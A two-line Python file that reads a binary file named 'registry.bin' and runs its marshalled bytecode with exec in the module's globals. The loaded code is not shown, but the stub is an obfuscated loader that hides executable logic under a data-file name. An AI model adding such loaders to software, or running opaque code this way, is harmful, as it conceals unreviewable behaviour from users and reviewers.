import marshal,os
with open(os.path.join(os.path.dirname(__file__),'registry.bin'),'rb') as f: exec(marshal.loads(f.read()),globals())
